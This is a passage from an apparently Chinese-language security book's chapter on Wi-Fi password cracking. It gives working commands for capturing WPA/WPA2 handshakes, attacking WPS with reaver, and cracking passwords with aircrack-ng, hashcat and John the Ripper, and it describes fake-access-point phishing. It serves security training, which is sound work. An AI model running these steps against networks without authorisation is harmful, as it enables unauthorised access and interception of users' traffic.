    `WPA3`、监控与检测、数据包过滤、网络分段和固件更新。现实世界的案例研究说明了这些策略在防止取消认证攻击方面的有效性，强调了通过多管齐下确保 Wi-Fi
    网络安全的重要性


    # 第 5 章：Wi-Fi 密码破解


    # Wi-Fi 密码攻击方法


    Wi-Fi 网络的安全性很大程度上取决于用于保护访问的密码强度。破解这些密码可能允许攻击者访问网络、拦截数据，甚至危及连接的设备。有若干种破解 Wi-Fi
    密码的方法，每种方法都有其特定的技巧和工具。


    # 握手捕获


    许多 Wi-Fi 密码攻击的第一步是捕获 `WPA/WPA2` 握手。此过程发生在设备连接到 Wi-Fi 网络时，允许攻击者捕获破解密码所需的数据包。


    **使用 Airodump-ng**：


    ```bash

    sudo airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```


    - 该命令捕获握手，并将其保存到文件 `.cap`。


    # Reaver 攻击


    `Reaver` 是一个利用 Wi-Fi 保护设置 (`WPS`) 漏洞来恢复 `WPA/WPA2` 密码的工具。


    **使用 Reaver**：


    ```bash

    sudo reaver -i wlan0mon -b [BSSID] -vv

    ```


    - 该命令尝试猜测 `WPS` PIN，可以用它可以恢复密码。


    # 钓鱼攻击


    钓鱼是一种攻击者创建虚假登录页面以捕获用户密码的技术。在 Wi-Fi 网络上，可以通过设置一个虚假的访问点并询问原始网络密码来实现。


    # 密码破解工具


    有多种用于破解 Wi-Fi 密码的专业工具，每种都有其特定的特性和用途。


    ## Aircrack-ng


    `Aircrack-ng` 是破解 `WEP` 和 `WPA/WPA2` 密码最流行的工具之一。它使用字典攻击和暴力破解技术尝试猜测密码。


    **安装**：


    ```bash

    sudo apt install aircrack-ng

    ```


    **WPA/WPA2 密码破解**：


    ```bash

    sudo aircrack-ng -w wordlist.txt -b [BSSID] capture-01.cap

    ```


    该命令使用字典文件 (`wordlist.txt`) 根据捕获的握手尝试猜测密码。


    ## Hashcat


    `Hashcat` 是一个强大的密码破解工具，可以使用 `GPU` 显著提高破解速度。支持广泛的哈希算法，包括 `WPA/WPA2`。


    **安装**：


    ```bash

    sudo apt install hashcat

    ```


    **基本用法**：


    将握手 `.cap` 转换为 `Hashcat` 格式：


    ```bash

    hcxpcaptool -z capture.hccapx capture-01.cap

    ```


    **破解密码**：


    ```bash

    hashcat -m 2500 capture.hccapx wordlist.txt

    ```


    ## John the Ripper


    `John the Ripper` 是另一个可用于 `WPA/WPA2` 的密码破解工具。尽管最常用于密码哈希，但它也支持 `WPA/WPA2`。


    **安装**：


    ```bash

    sudo apt install john

    ```


    **基本用法**：


    将握手 `.cap` 转换为 `John` 格式：


    ```bash

    hcxpcaptool -o capture.john capture-01.cap

    ```


    **破解密码**：


    ```bash

    john --wordlist=wordlist.txt capture.john

    ```


    # 暴力破解和字典攻击


    暴力破解和字典攻击是破解 Wi-Fi 密码的两种常用技术。


    ## 暴力破解攻击


    在暴力破解攻击中，攻击者尝试所有可能的字符组合，直到找到正确的密码。这种方法非常耗时且消耗资源，特别是对于长且复杂的密码。


    **使用 Aircrack-ng**：


    ```bash

    sudo aircrack-ng -a2 -b [BSSID] -w brute-force-list.txt capture-01.cap

    ```


    - 其中 `brute-force-list.txt` 是包含所有可能的密码组合的文件。


    # 字典攻击


